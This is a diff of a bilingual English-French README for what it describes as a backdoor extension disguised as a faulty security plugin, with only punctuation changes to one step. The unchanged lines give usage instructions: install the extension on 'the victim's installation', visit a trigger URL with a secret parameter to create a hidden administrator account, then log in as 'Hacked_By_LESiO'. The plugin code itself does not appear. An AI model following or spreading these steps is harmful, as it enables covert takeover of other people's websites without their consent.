@@ -3,7 +3,7 @@ Disguised as a faulty security plugin, the administrator account generated as we
 
 1 - Install the extension on the victim's installation and activate it.
 
-2 - Visit this URL to create the admin account "example.com?5394552785=BACKDOOR".
+2 - Visit this URL to create the admin account : example.com?5394552785=BACKDOOR
 
 3 - Login : Hacked_By_LESiO
 
@@ -20,7 +20,7 @@ Déguisé en extension de sécurité défaillante, le compte administrateur gén
 
 1 - Installez l'extension sur l'installation de la victime et activez-la.
 
-2 - Visitez cette URL pour créer le compte administrateur "example.com?5394552785=BACKDOOR".
+2 - Visitez cette URL pour créer le compte administrateur : example.com?5394552785=BACKDOOR
 
 3 - Nom d'utilisateur : Hacked_By_LESiO
 
